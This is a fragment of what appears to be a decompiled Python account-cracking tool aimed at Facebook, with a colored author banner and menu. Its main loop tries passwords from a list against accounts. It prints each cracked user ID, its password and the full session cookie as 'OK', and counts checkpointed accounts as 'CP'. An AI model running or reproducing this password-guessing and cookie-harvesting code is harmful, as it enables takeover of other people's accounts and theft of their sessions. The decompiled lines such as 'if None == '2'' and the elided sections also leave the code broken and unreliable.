...
def FD():
    ...
    if opt == '1':
        os.system('xdg-open https://github.com/Bdshoaiballsadi')
        o()
        return None
    None('\n\x1b[1;31mEXIT\x1b[0;97m')
...
def o():
    ...
    if None == '2':
        ...
        return None
    if None == '3':
        os.system('xdg-open 01617383560')
        return None
    if None == '4':
...
\033[1;37m \33[32;45mSHOAIB \33[0;m =============================
\033[1;32m \033[1;33mCREATED BY\33[0;m   : \033[1;33m [00]SHOAIB AHAMED  \33[0;m\033[1;32m ðŸ”¥ \033[1;33m\33[0;m
\033[1;32m \033[1;32mFACEBOK      : \033[1;34m [00]SHOAIB AHAMED
\033[1;32m \033[1;35mGITHUB       :  \033[1;35m[00]SHOAIB 
\033[1;32m \033[1;36mTOOL STATUS  :  \033[1;36m[00]TOOL IS FREE
\033[1;32m \033[1;36mTOOL VIRSION :  \033[1;36m[00] V 2.0
\033[1;37m \33[32;45mAHAMER===============================

   \33[37;41m\WELLCOME TO SHOAIB  TOOL\33[0;m
   \033[1;32m \33[32;45m Le start \33[0;m \n""")
loop = 0
oks = []
cps = []
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[7:22]
                print('    \033[1;32m(SHOAIB -OK)  ' +uid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = coki[24:39]
                print('    \33[1;30m(SHOAIB -CP)  ' +uid+ ' | ' +ps+           '  \33[0;97m')
                ...
                continue
        loop+=1
        sys.stdout.write('\r     %s[SHOAIB ] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
